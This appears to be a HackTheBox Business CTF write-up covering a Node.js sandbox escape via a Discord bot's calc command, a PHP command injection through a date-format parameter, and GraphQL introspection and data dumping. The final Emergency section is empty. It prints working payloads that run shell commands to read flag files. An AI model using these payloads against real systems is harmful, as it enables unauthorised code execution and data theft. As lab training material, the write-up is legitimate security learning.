# Business_CTF
Writeup for business ctf hackthebox

- [DiscordVM - Misc](#discordvm)
- [Time - Web](#time---web)
- [NoteQL - Web](#noteql---web)
- [Emergency - Web](#emergency---web)
## DiscordVM
Challenge Description

![DiscordVm](img/discordvm.PNG)

Since I can't use the space, I made the payload to decode url of the url encoded payload.
```
!calc eval(decodeURIComponent("const%20process%20%3D%20this.constructor.constructor%28%27return%20this.process%27%29%28%29%3Bprocess.mainModule.require%28%27child_process%27%29.execSync%28%27cat%20%2Fapp%2Fflag.txt%27%29.toString%28%29"))
```
![DiscordVm_Result](img/discordvm_result.png)

## Time - Web
Challenge files are given.

[webtime.zip](https://github.com/mgthuramoemyint/Business_CTF/blob/main/assets/web_time.zip)

I've opened the files and check index.php and found a function.
```php
$router = new Router();
$router->new('GET', '/', 'TimeController@index');
```
TimeController.php
```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```
TimeModel.php
```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```
So the `$_GET['format']` will be executed as `date '$format' 2>&1`
Command Injection:
```
http://host/?format=%Y-%m-%d-%27;$(cat%20../../flag)%27
```
![Time_Solved](img/time_solved.png)

## NoteQL - Web

The website is running with graphql, lets extract some data.  
Dump Database Schema
```json
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}
```
![Database Schema](img/noteql_1.png)
All Notes > Post  
Post 
```json
{"kind":"OBJECT","name":"Post","description":null,"fields":[{"name":"id","description":null,"args":[],"type":{"kind":"SCALAR","name":"ID","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"title","description":null,"args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"author","description":null,"args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"completed","description":null,"args":[],"type":{"kind":"SCALAR","name":"Int","ofType":null},"isDeprecated":false,"deprecationReason":null}
```
Extract Data From AllNotes 
```
{\n        AllNotes {\n            id,\n            title,\n            completed\n        }\n    }
```
![NoteQL Solved](img/noteql_solved.png)

## Emergency - Web
